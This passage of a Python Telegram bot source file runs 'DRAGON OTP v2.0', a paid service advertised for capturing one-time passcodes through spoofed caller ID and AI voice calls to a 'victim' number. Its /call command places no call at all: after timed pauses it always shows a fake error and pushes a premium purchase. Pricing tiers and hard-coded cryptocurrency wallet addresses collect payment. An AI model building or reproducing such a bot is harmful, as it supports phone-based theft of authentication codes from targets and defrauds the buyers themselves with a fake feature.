                InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
            ]
        ]
        )
            await callback.message.delete()
            await callback.message.answer("""⚠️ *You are not subscribed to our channel*

    To use the bot, please subscribe to the required channel\.

    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
        await callback.answer() 
    else:
        await callback.message.answer("🚫 You're banned from the bot.")


@dp.message(Command("call")) #DONE
async def send_local_video(message: Message):
    user_id = message.from_user.id
    if is_user_banned(user_id)==False:
        channel = "@dragonotpchannel"
        if is_user_subscribe(user_id):
            args = message.text.split(maxsplit=3)
            if len(args)!=4:
                await message.answer("You have to enter 3 arguments, /call [+xxxxx] [+xxxxx] [x]")
            else:
                victim=args[1]
                number=args[2]
                if victim[1:].isdecimal() and victim[0]=='+' and number[1:].isdecimal() and number[0]=='+' and args[3].isdecimal():
                    keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                    ],
                    [
                        InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
                    ]
                ]
                )
                    sleep(1)
                    await message.answer("📞 Call INITIATED")
                    sleep(8)
                    await message.answer("❌ ERROR[302]\n\n Sorry your country doesen't support the spofing.\n\nYou have to Buy a premium access.\n\n❕ With the premium access you can make calls from other countrys like USA UK... and get a full controll in the bot\nSorry for your time and thanks for your attention.\nContact the support to buy a premium subscription.",reply_markup=keyboard)
                elif not(args[1].isdecimal()) or not(args[1][0]=='+') or (args[2].isdecimal() ) or (args[2][0]=='+'):
                    await message.answer("You have to type a valid phone number start with +")
                elif not(args[3].isdecimal()):
                    await message.answer("The digits must be between 4 and 8")
        elif await is_user_subscribed_channel(bot, user_id, channel):
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="💳 Purchase Subscription", callback_data="Purchase")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
            await message.answer("❌ You have to Subscribe first to use this command!",reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
            ],
            [
                InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
            ]
        ]
        )
            await message.answer("""⚠️ *You are not subscribed to our channel*

    To use the bot, please subscribe to the required channel\.

    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
    else:
        await message.answer("🚫 You're banned from the bot.")


@dp.callback_query(F.data.in_(["Purchase"])) #DONE
async def handle_vote1(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if is_user_banned(user_id)==False:
        channel_username = "@dragonotpchannel"
        if await is_user_subscribed_channel(bot, user_id, channel_username):
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
            ],
            [
                InlineKeyboardButton(text="💲 USDT", callback_data="usdt"),
                InlineKeyboardButton(text="₿ BTC", callback_data="btc")
            ],
            [
                InlineKeyboardButton(text="𝑳 LTC", callback_data="ltc"),
                InlineKeyboardButton(text="◎ SOL", callback_data="sol")
            ]
        ]
        )
            await callback.message.delete()
            await callback.message.answer("""💰 DRAGON OTP v2\.0 \— Pricing Plans
Choose the plan that fits your workflow\.

━━━━━━━━━━━━━━━━━━━
📅 Subscription Options

• 🕐 1 Day Access — *$25*

• 🕑 2 Days Access — *$30*

• 🗓️ 1 Week Plan — *$40*

• 🗓️ 2 Weeks Plan — *$55*

• 📆 1 Month Plan — *$70*

• 📆 2 Months Plan — *$100*

• ♾️ Lifetime Access — *$350*

━━━━━━━━━━━━━━━━━━━

📩 How to Activate
After completing your payment\:

Take a screenshot of your payment confirmation\.

Send it to *SUPPORT* to verify and activate your subscription\.

❓ Need Help?
Have questions or need a different wallet option?
📬 Contact *SUPPORT* — we’re here to assist\.""",parse_mode='MarkdownV2',reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel")
            ],
            [
                InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
            ]
        ]
        )
            await callback.message.delete()
            await callback.message.answer("""⚠️ *You are not subscribed to our channel*

    To use the bot, please subscribe to the required channel\.

    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
        await callback.answer() 
    else:
        await callback.message.answer("🚫 You're banned from the bot.")


@dp.callback_query(F.data.in_(["Features"])) #DONE
async def handle_vote1(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if is_user_banned(user_id)==False:
        channel_username = "@dragonotpchannel"
        if await is_user_subscribed_channel(bot, user_id, channel_username):
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
            await callback.message.delete()
            image = FSInputFile("img.jpg")  # Path to your local file
            await callback.message.answer_photo(image, caption="""🐲 *DRAGON OTP v2\.0 — Unique Features That Set You Apart*

    🚀 Lightning Fast OTP Delivery  
    🎭 Custom Caller ID \(Spoofing Mode\)  
    🔊 AI Voice Calls with Human Detection  
    📞 Call Any Number Worldwide  
    📦 Multiple OTP Services Supported  
    📁 Live Call Recording \& Logs  
    📊 Real\-Time Dashboard \& Analytics  
    🔐 Encrypted Access \& Security  
    📲 Use Anywhere Anytime""",parse_mode='MarkdownV2',reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel"),
            ],
            [
                InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
            ]
        ]
        )
            await callback.message.delete()
            await callback.message.answer("""⚠️ *You are not subscribed to our channel*

    To use the bot, please subscribe to the required channel\.

    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
        await callback.answer() 
    else:
        await callback.message.answer("🚫 You're banned from the bot.")


@dp.callback_query(F.data.in_(["enter"])) #DONE
async def handle_vote1(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    if is_user_banned(user_id)==False:
        channel_username = "@dragonotpchannel"
        if await is_user_subscribed_channel(bot, user_id, channel_username):
            if is_user_subscribe(user_id):
                keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
                ]
            ]
            )
                await callback.message.delete()
                video = FSInputFile("img.jpg")  # Path to your local file
                await callback.message.answer_photo(video, caption="""🐲 *Dragon OTP v2\.0 Bot*
    📡 *Status*\: Fully Operational \| ⏱️ *Uptime: 100%*

    🚀 *Limited Access*\: Only few spots remaining\!

    ⚠️ Active License Detected\!""",parse_mode='MarkdownV2',reply_markup=keyboard)
            else:
                keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="💳 Purchase Subscription", callback_data="Purchase")
                ],
                [
                    InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
                ]
            ]
            )
                await callback.message.delete()
                video = FSInputFile("img.jpg")  # Path to your local file
                await callback.message.answer_photo(video, caption="""🐲 *Dragon OTP v2\.0 Bot*
    📡 *Status*\: Fully Operational \| ⏱️ *Uptime: 100%*

    🚀 *Limited Access*\: Only few spots remaining\!

    ⚠️ No Active License Detected\!

    🔐 To activate the bot, you must first purchase a license\.
    💸 We recommend getting a [LICENSE BUNDLE](https\://t\.me/dragonotpowner) for exclusive features and the best discounted price\!""",parse_mode='MarkdownV2',reply_markup=keyboard)
        else:
            keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🌐 Community", url="https://t.me/dragonotpchannel")
            ],
            [
                InlineKeyboardButton(text="📍 I've Subscribed", callback_data="start")
            ]
        ]
        )
            await callback.message.delete()
            await callback.message.answer("""⚠️ *You are not subscribed to our channel*

    To use the bot, please subscribe to the required channel\.

    👇 Click the buttons below to reach our channel\:""",parse_mode='MarkdownV2', reply_markup=keyboard)
        await callback.answer()
    else:
        await callback.message.answer("🚫 You're banned from the bot.")

@dp.callback_query(F.data.in_(["btc"])) #DONE
async def handle_vote1(callback: CallbackQuery):
    user_id=callback.from_user.id
    if is_user_banned(user_id)==False:
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*Bitcoin \(BTC\)*
                                    
• `bc1q98y83fh28y6ysklu9qmla7enuegldmgdcdawvk`""",parse_mode='MarkdownV2', reply_markup=keyboard)
    else:
        await callback.message.answer("🚫 You're banned from the bot.")    


@dp.callback_query(F.data.in_(["usdt"])) #DONE
async def handle_vote1(callback: CallbackQuery):
    user_id = callback.from_user.id
    if is_user_banned(user_id)==False:
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*USDT \(TRC20\)*
                                    
• `TRRVAuPEGJ4EgE33u1pV6gNUXxM1R5v1aY`""",parse_mode='MarkdownV2', reply_markup=keyboard)
    else:
        await callback.message.answer("🚫 You're banned from the bot.")

@dp.callback_query(F.data.in_(["sol"])) #DONE
async def handle_vote1(callback: CallbackQuery):
    user_id=callback.from_user.id
    if is_user_banned(user_id)==False:
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*Solana \(SOL\)*
                                  
• `8Ra9HKVrKNakEeQfqDzrVn1sFoQoFmbR51UHMRweT9hY`""",parse_mode='MarkdownV2', reply_markup=keyboard)
    else:
        await callback.message.answer("🚫 You're banned from the bot.")

@dp.callback_query(F.data.in_(["ltc"])) #DONE
async def handle_vote1(callback: CallbackQuery):
    user_id=callback.from_user.id
    if is_user_banned(user_id)==False:
        keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
            InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
            ],
            [
                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="start")
            ]
        ]
        )
        await callback.message.delete()
        await callback.message.answer("""*Litecoin \(LTC\)*
                                  
• `LRJ8n55djedy4jyKP3Kkqi6iEy3BYC1FLt`""",parse_mode='MarkdownV2', reply_markup=keyboard)
    else:
        await callback.message.answer("🚫 You're banned from the bot.")

@dp.message(lambda message: message.text and message.text.startswith('/'))
async def unknown_command(message: Message):
    user_id=message.from_user.id
    if is_user_banned(user_id)==False:
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                ]])
        await message.answer("❌ Unknown command. Contact the support for help.",reply_markup=keyboard)
    else:
        await message.answer("🚫 You're banned from the bot.")
# Fallback handler for unknown text messages

@dp.message()
async def unknown_text(message: Message):
    user_id = message.from_user.id
    if is_user_banned(user_id)==False:
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text="📞 Support", url="https://t.me/dragonotpowner")
                ]])
        await message.answer("🤖 Sorry I didn't understand that. Please contact the support for any question.",reply_markup=keyboard)
    else:
        await message.answer("🚫 You're banned from the bot.")
# Run bot
async def main():
    create_users_table()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
